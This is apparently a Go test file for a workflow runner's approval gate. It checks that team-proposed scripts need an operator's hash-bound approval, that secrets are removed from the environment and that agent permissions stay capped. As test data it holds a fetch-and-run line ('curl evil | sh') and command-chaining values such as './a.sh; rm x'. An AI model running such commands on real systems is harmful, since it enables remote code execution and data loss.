package background

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/subgentic/coral/internal/store"
)

func TestRepoFileOfNamesOnlyALonePlainCallOfARepoPath(t *testing.T) {
	yes := map[string]string{"./run.sh": "./run.sh", "scripts/x.py --since 2024-01-01": "scripts/x.py", "  ./a/b.sh x y ": "./a/b.sh", "../up.sh": "../up.sh"}
	for cmd, want := range yes {
		if got, ok := RepoFileOf(cmd); !ok || got != want {
			t.Errorf("RepoFileOf(%q) = %q, %v; want %q", cmd, got, ok, want)
		}
	}
	for _, cmd := range []string{"make", "make clean-reports", "npm test", "go test ./...", "curl https://x/y", "/usr/bin/env x", "~/x.sh", "./a.sh && make", "./a.sh | tee out", "./a.sh; rm x", "./a.sh $(date)", "'./a.sh'", "\"./a.sh\"", "./a.sh > out", "./a.sh\nmake", "$HOME/x.sh", "-x/y", "./a*.sh", "", "   ", "bash scripts/x.sh", "{{prev_content}}/x.sh"} {
		if got, ok := RepoFileOf(cmd); ok {
			t.Errorf("RepoFileOf(%q) = %q: that is more than a lone call of a repo file", cmd, got)
		}
	}
}

func approvedRig(t *testing.T, steps []StepDef) (*store.WorkflowStore, *WorkflowRunner, *store.Workflow, string) {
	t.Helper()
	db := setupTestDB(t)
	wfStore := store.NewWorkflowStore(db)
	rt := newWfMockRuntime()
	runner := NewWorkflowRunner(wfStore, &AgentLauncher{runtime: rt}, rt, nil, nil, t.TempDir(), "localhost", 8420)
	repo := t.TempDir()
	b, _ := json.Marshal(steps)
	wf := &store.Workflow{Name: "nightly", Team: "web-shop", ProposedBy: "Orchestrator", StepsJSON: string(b), RepoPath: repo, MaxDurationS: 60}
	return wfStore, runner, wf, repo
}

func approveNow(t *testing.T, ws *store.WorkflowStore, wf *store.Workflow) string {
	t.Helper()
	ctx := context.Background()
	job, _ := ws.TeamWorkflowJobOf(ctx, wf.ID)
	a, err := ApprovalOf(wf, job)
	if err != nil {
		t.Fatalf("approval: %v", err)
	}
	cur := func(w *store.Workflow, j *store.ScheduledJob) (string, string, error) {
		x, err := ApprovalOf(w, j)
		return x.Hash, ApprovalSnapshot(w, j), err
	}
	if err := ws.ApproveTeamWorkflow(ctx, wf.ID, a.Hash, a.FilesJSON(), "Operator", cur); err != nil {
		t.Fatalf("approve: %v", err)
	}
	return a.Hash
}

func TestTheApprovalHashCoversEverythingThatRunsOrDecidesWhenItRuns(t *testing.T) {
	repo := t.TempDir()
	if err := os.WriteFile(filepath.Join(repo, "run.sh"), []byte("echo one\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	steps := `[{"name":"a","type":"shell","command":"./run.sh"},{"name":"b","type":"agent","prompt":"p","agent":{"agent_type":"claude","model":"m1"}}]`
	base := store.Workflow{Name: "n", Team: "t", StepsJSON: steps, RepoPath: repo, BaseBranch: "main", MaxDurationS: 60, CleanupWorktree: 1, DefaultAgentJSON: `{"agent_type":"claude"}`}
	job := &store.ScheduledJob{CronExpr: "0 7 * * 1-5", Timezone: "UTC", MaxDurationS: 60}
	h := func(w store.Workflow, j *store.ScheduledJob) string {
		a, err := ApprovalOf(&w, j)
		if err != nil {
			t.Fatalf("approval: %v", err)
		}
		return a.Hash
	}
	want := h(base, job)
	if h(base, job) != want {
		t.Fatal("the hash is not stable")
	}
	respelled := base
	respelled.StepsJSON = `[ {"type":"shell","command":"./run.sh","name":"a"}, {"agent":{"model":"m1","agent_type":"claude"},"prompt":"p","type":"agent","name":"b"} ]`
	if h(respelled, job) != want {
		t.Error("the same steps spelled with other key order or spacing must hash equal")
	}
	change := map[string]func(w *store.Workflow, j **store.ScheduledJob){
		"command": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = strings.Replace(w.StepsJSON, "./run.sh", "./run.sh --x", 1)
		},
		"prompt": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = strings.Replace(w.StepsJSON, `"p"`, `"q"`, 1)
		},
		"model": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = strings.Replace(w.StepsJSON, "m1", "m2", 1)
		},
		"continue": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = strings.Replace(w.StepsJSON, `"name":"a"`, `"name":"a","continue_on_failure":true`, 1)
		},
		"timeout": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = strings.Replace(w.StepsJSON, `"name":"a"`, `"name":"a","timeout_s":5`, 1)
		},
		"env": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = strings.Replace(w.StepsJSON, `"name":"a"`, `"name":"a","env":{"X":"1"}`, 1)
		},
		"repo_path": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.RepoPath = t.TempDir()
			_ = os.WriteFile(filepath.Join(w.RepoPath, "run.sh"), []byte("echo one\n"), 0o755)
		},
		"board":         func(w *store.Workflow, _ **store.ScheduledJob) { w.Board = "web-shop" },
		"default agent": func(w *store.Workflow, _ **store.ScheduledJob) { w.DefaultAgentJSON = `{"agent_type":"codex"}` },
		"max duration":  func(w *store.Workflow, _ **store.ScheduledJob) { w.MaxDurationS = 61 },
		"base branch":   func(w *store.Workflow, _ **store.ScheduledJob) { w.BaseBranch = "dev" },
		"schedule":      func(_ *store.Workflow, j **store.ScheduledJob) { c := **j; c.CronExpr = "0 7 * * *"; *j = &c },
		"timezone":      func(_ *store.Workflow, j **store.ScheduledJob) { c := **j; c.Timezone = "Asia/Tokyo"; *j = &c },
		"no schedule":   func(_ *store.Workflow, j **store.ScheduledJob) { *j = nil },
		"a step's name": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = strings.Replace(w.StepsJSON, `"name":"b"`, `"name":"c"`, 1)
		},
		"the repo file": func(w *store.Workflow, _ **store.ScheduledJob) {
			_ = os.WriteFile(filepath.Join(w.RepoPath, "run.sh"), []byte("echo two\n"), 0o755)
		},
		"the team":        func(w *store.Workflow, _ **store.ScheduledJob) { w.Team = "other" },
		"the description": func(w *store.Workflow, _ **store.ScheduledJob) { w.Description = "changed" },
		"step order": func(w *store.Workflow, _ **store.ScheduledJob) {
			w.StepsJSON = `[` + w.StepsJSON[strings.Index(w.StepsJSON, `{"name":"b"`):len(w.StepsJSON)-1] + `,` + w.StepsJSON[1:strings.Index(w.StepsJSON, `,{"name":"b"`)] + `]`
		},
	}
	for name, mut := range change {
		w, j := base, job
		mut(&w, &j)
		if h(w, j) == want {
			t.Errorf("changing %s does not change the hash", name)
		}
		_ = os.WriteFile(filepath.Join(repo, "run.sh"), []byte("echo one\n"), 0o755) // the file mutation above wrote into the shared repo: put it back for the next case
	}
}

func TestAStepThatRunsAMissingOrOutsideFileIsRefusedNotApproved(t *testing.T) {
	repo := t.TempDir()
	outside := filepath.Join(t.TempDir(), "evil.sh")
	_ = os.WriteFile(outside, []byte("x"), 0o755)
	if runtime.GOOS != "windows" {
		_ = os.Symlink(outside, filepath.Join(repo, "link.sh"))
	}
	for _, cmd := range []string{"./missing.sh", "../" + filepath.Base(filepath.Dir(outside)) + "/evil.sh", "./link.sh", "./"} {
		if runtime.GOOS == "windows" && cmd == "./link.sh" {
			continue
		}
		wf := store.Workflow{Name: "n", Team: "t", RepoPath: repo, StepsJSON: `[{"name":"a","type":"shell","command":` + jsonString(cmd) + `}]`}
		_, err := ApprovalOf(&wf, nil)
		var ae *ApprovalError
		if !errors.As(err, &ae) {
			t.Errorf("%q: err = %v, want an ApprovalError", cmd, err)
		}
	}
}

func jsonString(s string) string { b, _ := json.Marshal(s); return string(b) }

func TestARunOfATeamWorkflowNeedsTheOperatorsApprovalOfWhatItIsNow(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell script steps")
	}
	ctx := context.Background()
	ws, runner, wf, repo := approvedRig(t, []StepDef{{Name: "check", Type: "shell", Command: "./check.sh"}})
	script := filepath.Join(repo, "check.sh")
	_ = os.WriteFile(script, []byte("#!/bin/sh\nexit 78\n"), 0o755)
	job := &store.ScheduledJob{Name: "nightly", CronExpr: "0 7 * * *", Timezone: "UTC"}
	created, createdJob, err := ws.CreateTeamWorkflow(ctx, wf, job, "h", time.Now())
	if err != nil {
		t.Fatal(err)
	}
	if created.Enabled != 0 || createdJob.Enabled != 0 {
		t.Fatalf("a proposal starts off: workflow %d, job %d", created.Enabled, createdJob.Enabled)
	}
	var asked []string
	runner.SetApprovalNeeded(func(_ context.Context, w *store.Workflow) { asked = append(asked, w.Name) })

	var rae *ApprovalRequiredError
	if _, err := runner.TriggerWorkflow(ctx, created, "api", nil); !errors.As(err, &rae) {
		t.Fatalf("an unapproved proposal ran: %v", err)
	}

	hash := approveNow(t, ws, created)
	on, _ := ws.GetWorkflow(ctx, created.ID)
	onJob, _ := ws.TeamWorkflowJobOf(ctx, created.ID)
	if on.Enabled != 1 || onJob.Enabled != 1 || on.ApprovedHash != hash {
		t.Fatalf("approving enables exactly this hash: wf %d job %d hash %q", on.Enabled, onJob.Enabled, on.ApprovedHash)
	}
	run, err := runner.TriggerWorkflow(ctx, on, "api", nil)
	if err != nil {
		t.Fatalf("an approved workflow did not run: %v", err)
	}
	waitForRun(t, ws, run.ID, 10*time.Second)
	if final, _ := ws.GetWorkflowRunDirect(ctx, run.ID); final.Status != store.RunQuiet {
		t.Fatalf("the approved script ran and exited 78: status %q", final.Status)
	}

	// the team edits the file the step runs: the next run is refused, both are turned off, and the Operator is asked again
	_ = os.WriteFile(script, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755)
	if _, err := runner.TriggerWorkflow(ctx, on, "api", nil); !errors.As(err, &rae) || !rae.Changed {
		t.Fatalf("a changed file ran: %v", err)
	}
	off, _ := ws.GetWorkflow(ctx, created.ID)
	offJob, _ := ws.TeamWorkflowJobOf(ctx, created.ID)
	if off.Enabled != 0 || offJob.Enabled != 0 {
		t.Errorf("a refused run turns both off: wf %d job %d", off.Enabled, offJob.Enabled)
	}
	if len(asked) != 1 || asked[0] != "nightly" {
		t.Errorf("the Operator is asked again, once: %v", asked)
	}
	// turned off, it stays refused even when the file is put back, until the Operator approves
	_ = os.WriteFile(script, []byte("#!/bin/sh\nexit 78\n"), 0o755)
	if _, err := runner.TriggerWorkflow(ctx, off, "api", nil); err == nil {
		t.Error("a workflow that is off ran")
	}
}

func TestAnOrdinaryWorkflowIsNotHeldToTheTeamGate(t *testing.T) {
	_, run, _ := runQuietWorkflow(t, []StepDef{{Name: "check", Type: "shell", Command: "exit 78"}})
	if run.Status != store.RunQuiet {
		t.Fatalf("an Operator's workflow runs as before: %q", run.Status)
	}
}

func TestAStepOfATeamWorkflowStopsWhenAnEarlierStepChangedTheFileItRuns(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell script steps")
	}
	ctx := context.Background()
	ws, runner, wf, repo := approvedRig(t, nil)
	_ = os.WriteFile(filepath.Join(repo, "b.sh"), []byte("#!/bin/sh\ntouch ran-b\n"), 0o755)
	steps := []StepDef{{Name: "one", Type: "shell", Command: "echo '#!/bin/sh' > b.sh; echo 'touch evil' >> b.sh"}, {Name: "two", Type: "shell", Command: "./b.sh"}}
	b, _ := json.Marshal(steps)
	wf.StepsJSON = string(b)
	created, _, err := ws.CreateTeamWorkflow(ctx, wf, nil, "h", time.Now())
	if err != nil {
		t.Fatal(err)
	}
	approveNow(t, ws, created)
	on, _ := ws.GetWorkflow(ctx, created.ID)
	run, err := runner.TriggerWorkflow(ctx, on, "api", nil)
	if err != nil {
		t.Fatal(err)
	}
	waitForRun(t, ws, run.ID, 10*time.Second)
	final, _ := ws.GetWorkflowRunDirect(ctx, run.ID)
	if final.Status != "failed" {
		t.Fatalf("status %q, want failed: step two ran a file step one rewrote", final.Status)
	}
	for _, f := range []string{"evil", "ran-b"} {
		if _, err := os.Stat(filepath.Join(repo, f)); err == nil {
			t.Errorf("%s exists: the rewritten file ran", f)
		}
	}
	if off, _ := ws.GetWorkflow(ctx, created.ID); off.Enabled != 0 {
		t.Error("the workflow is still on")
	}
}

func TestAShellStepOfATeamWorkflowHasNoSecretsFromCoralsEnvironment(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("env via sh")
	}
	t.Setenv("ANTHROPIC_API_KEY", "sk-test-secret")
	t.Setenv("GITHUB_TOKEN", "ghp_test_secret")
	t.Setenv("CORAL_SESSION_TOKEN", "sess-secret")
	t.Setenv("CORAL_CLOUD_API_KEY", "hub-secret")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "aws-secret")
	t.Setenv("SSH_AUTH_SOCK", "/tmp/agent.sock")
	ctx := context.Background()
	ws, runner, wf, repo := approvedRig(t, []StepDef{{Name: "env", Type: "shell", Command: "env > env.txt"}})
	created, _, err := ws.CreateTeamWorkflow(ctx, wf, nil, "h", time.Now())
	if err != nil {
		t.Fatal(err)
	}
	approveNow(t, ws, created)
	on, _ := ws.GetWorkflow(ctx, created.ID)
	run, err := runner.TriggerWorkflow(ctx, on, "api", nil)
	if err != nil {
		t.Fatal(err)
	}
	waitForRun(t, ws, run.ID, 10*time.Second)
	if final, _ := ws.GetWorkflowRunDirect(ctx, run.ID); final.Status != "completed" {
		t.Fatalf("status %q", final.Status)
	}
	got, err := os.ReadFile(filepath.Join(repo, "env.txt"))
	if err != nil {
		t.Fatal(err)
	}
	text := string(got)
	for _, secret := range []string{"sk-test-secret", "ghp_test_secret", "sess-secret", "hub-secret", "aws-secret", "agent.sock", "ANTHROPIC", "GITHUB_TOKEN", "CORAL_AUTOMATION_TOKEN", "CORAL_INTERNAL_STRICT_ENV"} {
		if strings.Contains(text, secret) {
			t.Errorf("the step's environment holds %q", secret)
		}
	}
	for _, need := range []string{"PATH=", "CORAL_WORKFLOW_NAME=nightly", "CORAL_WORKFLOW_RUN_ID="} {
		if !strings.Contains(text, need) {
			t.Errorf("the step's environment lacks %q", need)
		}
	}
}

func TestATeamsAgentStepRunsUnderTheCapOfAnAgentLaunch(t *testing.T) {
	wf := func(steps string) *store.Workflow { return &store.Workflow{Name: "n", Team: "t", StepsJSON: steps} }
	for name, steps := range map[string]string{
		"flags":        `[{"name":"a","type":"agent","prompt":"p","agent":{"agent_type":"claude","flags":["--dangerously-skip-permissions"]}}]`,
		"tools":        `[{"name":"a","type":"agent","prompt":"p","agent":{"agent_type":"claude","tools":["Bash"]}}]`,
		"capabilities": `[{"name":"a","type":"agent","prompt":"p","agent":{"agent_type":"claude","capabilities":{"allow":["Bash(*)"]}}}]`,
		"hooks":        `[{"name":"a","type":"shell","command":"true","hooks":{"Stop":[]}}]`,
		"interactive":  `[{"name":"a","type":"agent","prompt":"p","interactive":true,"agent":{"agent_type":"claude"}}]`,
		"connections":  `[{"name":"a","type":"shell","command":"true","connections":["x"]}]`,
		"pi":           `[{"name":"a","type":"agent","prompt":"p","agent":{"agent_type":"pi"}}]`,
		"codex":        `[{"name":"a","type":"agent","prompt":"p","agent":{"agent_type":"codex","model":"x"}}]`,
	} {
		if TeamStepsProblem(wf(steps)) == "" {
			t.Errorf("%s: an agent step may not widen the cap", name)
		}
	}
	d := wf(`[{"name":"a","type":"agent","prompt":"p"}]`)
	d.DefaultAgentJSON = `{"agent_type":"claude","flags":["--dangerously-skip-permissions"]}`
	if TeamStepsProblem(d) == "" {
		t.Error("the default agent may not carry flags")
	}
	if why := TeamStepsProblem(wf(`[{"name":"a","type":"agent","prompt":"p","agent":{"agent_type":"claude","model":"sonnet"}},{"name":"b","type":"shell","command":"true"}]`)); why != "" {
		t.Errorf("a plain agent step and a shell step are fine: %s", why)
	}
}

func TestOnlyTheOperatorsApprovalEnablesAndOnlyOfTheHashItWasShown(t *testing.T) {
	ctx := context.Background()
	ws, _, wf, _ := approvedRig(t, []StepDef{{Name: "a", Type: "shell", Command: "true"}})
	created, _, err := ws.CreateTeamWorkflow(ctx, wf, &store.ScheduledJob{Name: "nightly", CronExpr: "0 7 * * *"}, "h", time.Now())
	if err != nil {
		t.Fatal(err)
	}
	cur := func(w *store.Workflow, j *store.ScheduledJob) (string, string, error) {
		x, err := ApprovalOf(w, j)
		return x.Hash, ApprovalSnapshot(w, j), err
	}
	shown, _ := ApprovalOf(created, nil)
	// the card was filed, then the Orchestrator changed the proposal: the old click enables nothing
	changed := *created
	changed.StepsJSON = `[{"name":"a","type":"shell","command":"true && echo changed"}]`
	if _, _, err := ws.ReplaceTeamWorkflow(ctx, &changed, &store.ScheduledJob{Name: "nightly", CronExpr: "0 7 * * *"}, "h2", "Orchestrator", time.Now()); err != nil {
		t.Fatal(err)
	}
	if err := ws.ApproveTeamWorkflow(ctx, created.ID, shown.Hash, "[]", "Operator", cur); !errors.Is(err, store.ErrTeamWorkflowChanged) {
		t.Fatalf("an old click approved a changed workflow: %v", err)
	}
	got, _ := ws.GetWorkflow(ctx, created.ID)
	j, _ := ws.TeamWorkflowJobOf(ctx, created.ID)
	if got.Enabled != 0 || j.Enabled != 0 || got.ApprovedHash != "" {
		t.Errorf("nothing was enabled: wf %d job %d approved %q", got.Enabled, j.Enabled, got.ApprovedHash)
	}
}

func TestAnOrchestratorsChangeTurnsBothOffInTheSameWrite(t *testing.T) {
	ctx := context.Background()
	ws, _, wf, _ := approvedRig(t, []StepDef{{Name: "a", Type: "shell", Command: "true"}})
	created, _, err := ws.CreateTeamWorkflow(ctx, wf, &store.ScheduledJob{Name: "nightly", CronExpr: "0 7 * * *"}, "h", time.Now())
	if err != nil {
		t.Fatal(err)
	}
	approveNow(t, ws, created)
	on, _ := ws.GetWorkflow(ctx, created.ID)
	if on.Enabled != 1 {
		t.Fatal("not approved")
	}
	edit := *on
	edit.Description = "new words"
	if _, _, err := ws.ReplaceTeamWorkflow(ctx, &edit, &store.ScheduledJob{Name: "nightly", CronExpr: "30 7 * * *"}, "h2", "Orchestrator", time.Now()); err != nil {
		t.Fatal(err)
	}
	off, _ := ws.GetWorkflow(ctx, created.ID)
	j, _ := ws.TeamWorkflowJobOf(ctx, created.ID)
	if off.Enabled != 0 || j.Enabled != 0 || j.CronExpr != "30 7 * * *" {
		t.Errorf("a change leaves both off: wf %d job %d cron %q", off.Enabled, j.Enabled, j.CronExpr)
	}
	if off.ApprovedHash != on.ApprovedHash {
		t.Error("the approved hash is kept, so the card can say what it was")
	}
	// removing the schedule removes the job; dropping a schedule never leaves an enabled one behind
	if _, _, err := ws.ReplaceTeamWorkflow(ctx, &edit, nil, "h3", "Orchestrator", time.Now()); err != nil {
		t.Fatal(err)
	}
	if j, _ := ws.TeamWorkflowJobOf(ctx, created.ID); j != nil {
		t.Error("the job stayed after the change gave no schedule")
	}
}

func TestATeamsProposalsAreCappedPerTeamAndPerHour(t *testing.T) {
	ctx := context.Background()
	ws, _, wf, _ := approvedRig(t, []StepDef{{Name: "a", Type: "shell", Command: "true"}})
	now := time.Now()
	var last error
	made := 0
	for i := 0; i < 20; i++ {
		w := *wf
		w.Name = "w" + string(rune('a'+i))
		if _, _, last = ws.CreateTeamWorkflow(ctx, &w, nil, "h", now); last != nil {
			break
		}
		made++
	}
	if made != store.MaxTeamProposalsPerHour || !errors.Is(last, store.ErrTeamProposalRate) {
		t.Fatalf("made %d, last %v: the hour's limit is %d", made, last, store.MaxTeamProposalsPerHour)
	}
	// an hour on, the per-team total limit holds
	later := now.Add(61 * time.Minute)
	var err error
	for i := 0; i < 20; i++ {
		w := *wf
		w.Name = "z" + string(rune('a'+i))
		if _, _, err = ws.CreateTeamWorkflow(ctx, &w, nil, "h", later); err != nil {
			break
		}
	}
	if !errors.Is(err, store.ErrTeamWorkflowLimit) && !errors.Is(err, store.ErrTeamProposalRate) {
		t.Fatalf("no limit held: %v", err)
	}
	if list, _ := ws.ListTeamWorkflows(ctx, "web-shop"); len(list) > store.MaxTeamWorkflows {
		t.Errorf("%d workflows held, cap %d", len(list), store.MaxTeamWorkflows)
	}
}

// The gate asks the database whether a workflow is a team's, not the value it is handed: a value read without its team (a query that did not join the side table) cannot make a proposal run.
func TestTheGateDecidesByTheDatabaseNotByTheValueItIsHanded(t *testing.T) {
	ctx := context.Background()
	ws, runner, wf, _ := approvedRig(t, []StepDef{{Name: "a", Type: "shell", Command: "true"}})
	created, _, err := ws.CreateTeamWorkflow(ctx, wf, nil, "h", time.Now())
	require.NoError(t, err)
	bare := &store.Workflow{ID: created.ID, Name: created.Name, StepsJSON: created.StepsJSON, RepoPath: created.RepoPath, Enabled: 1} // no Team
	var rae *ApprovalRequiredError
	_, err = runner.TriggerWorkflow(ctx, bare, "api", nil)
	require.True(t, errors.As(err, &rae), "a proposal handed over without its team still needs the approval: %v", err)
}
